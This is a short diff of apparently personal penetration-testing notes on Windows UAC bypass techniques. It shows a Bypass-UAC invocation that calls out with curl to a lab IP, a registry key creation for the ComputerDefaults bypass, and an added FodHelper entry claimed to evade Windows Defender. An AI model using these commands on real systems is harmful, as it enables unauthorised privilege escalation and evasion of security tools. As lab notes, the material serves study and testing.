@@ -2,6 +2,10 @@
 
 - Invoke and run: `Bypass-UAC -Command "curl http://192.168.45.223/worked"`
 
+### FodHelper
+
+uses CurVer to abuse UAC, should bypass Windows Defender (?)
+
 ### Manual Approach - ComputerDefaults
 
     New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
